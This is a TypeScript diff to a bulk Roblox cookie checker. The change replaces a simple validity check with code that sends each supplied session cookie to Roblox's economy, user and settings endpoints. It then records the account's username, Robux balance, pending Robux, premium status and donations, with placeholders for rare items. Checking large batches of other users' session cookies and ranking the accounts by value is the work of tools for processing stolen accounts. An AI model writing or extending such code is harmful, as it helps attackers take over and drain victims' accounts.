@@ -38,25 +38,30 @@ export async function validateCookies(cookies: string[]): Promise<void> {
   for (const cookie of cookies) {
     queueService.enqueue(async () => {
       try {
-        // Validate the cookie - simple check if it's valid
-        const isValid = await checkCookieValid(cookie);
+        // Get detailed account info
+        const accountInfo = await checkCookieValid(cookie);
         
-        // Create account info object
-        const accountInfo: RobloxAccount = {
-          cookie,
-          isValid,
-          username: isValid ? "Valid Account" : "",
-          userId: "",
-          robuxBalance: 0,
-          pendingRobux: 0,
-          premium: false,
-          donations: 0,
-          rap: 0,
-          hasHeadless: false,
-          hasKorblox: false,
-          avatarUrl: "",
-          processedAt: new Date().toISOString(),
-        };
+        if (!accountInfo) {
+          // Store invalid result
+          await storage.storeCookie({
+            cookie,
+            isValid: false,
+            username: "",
+            userId: "",
+            robuxBalance: 0,
+            pendingRobux: 0,
+            premium: false,
+            donations: 0,
+            rap: 0,
+            hasHeadless: false,
+            hasKorblox: false,
+            avatarUrl: "",
+            processedAt: new Date().toISOString(),
+          });
+          queueService.processingComplete(false);
+          queueService.addLogEntry(`✗ Invalid cookie`);
+          return;
+        }
         
         // Store the result
         await storage.storeCookie(accountInfo);
@@ -110,30 +115,49 @@ export async function validateCookies(cookies: string[]): Promise<void> {
  * @param cookie Roblox cookie to validate
  * @returns Promise<boolean> indicating if cookie is valid
  */
-async function checkCookieValid(cookie: string): Promise<boolean> {
+async function checkCookieValid(cookie: string): Promise<RobloxAccount | null> {
   try {
-    const response = await fetch(`${ROBLOX_API_BASE}${ROBLOX_AUTH_ENDPOINT}`, {
-      headers: {
-        Cookie: formatCookie(cookie),
-      },
-    });
+    const headers = { Cookie: formatCookie(cookie) };
+
+    // Check currency/robux (validates cookie)
+    const robuxResponse = await fetch('https://economy.roblox.com/v1/user/currency', { headers });
+    if (!robuxResponse.ok) return null;
+    const robuxData = await robuxResponse.json();
     
-    if (!response.ok) {
-      return false;
-    }
-    
-    // Явно типизируем данные как объект с интерфейсом
-    interface AuthResponse {
-      isAuthenticated?: boolean;
-      [key: string]: any;
-    }
-    
-    const data = await response.json() as AuthResponse;
-    
-    // Проверяем наличие флага isAuthenticated
-    return Boolean(data?.isAuthenticated);
-  } catch (error: any) {
+    // Get user info
+    const userResponse = await fetch('https://users.roblox.com/v1/users/authenticated', { headers });
+    if (!userResponse.ok) return null;
+    const userData = await userResponse.json();
+
+    // Get settings
+    const settingsResponse = await fetch('https://www.roblox.com/my/settings/json', { headers });
+    if (!settingsResponse.ok) return null;
+    const settingsData = await settingsResponse.json();
+
+    // Get transactions
+    const transactionsResponse = await fetch(
+      `https://economy.roblox.com/v2/users/${userData.id}/transaction-totals?timeFrame=Year&transactionType=summary`,
+      { headers }
+    );
+    const transactionsData = await transactionsResponse.json();
+
+    return {
+      cookie,
+      isValid: true,
+      username: userData.name,
+      userId: userData.id.toString(),
+      robuxBalance: robuxData.robux || 0,
+      pendingRobux: transactionsData?.pendingRobuxTotal || 0,
+      premium: Boolean(settingsData.isPremium),
+      donations: transactionsData?.incomingRobuxTotal || 0,
+      rap: 0, // Would need additional API call
+      hasHeadless: false, // Would need inventory check
+      hasKorblox: false, // Would need inventory check
+      avatarUrl: `https://www.roblox.com/avatar-thumbnails?userId=${userData.id}&size=150x150`,
+      processedAt: new Date().toISOString()
+    };
+  } catch (error) {
     console.error(`Cookie validation failed: ${error.message || 'Unknown error'}`);
-    return false;
+    return null;
   }
 }
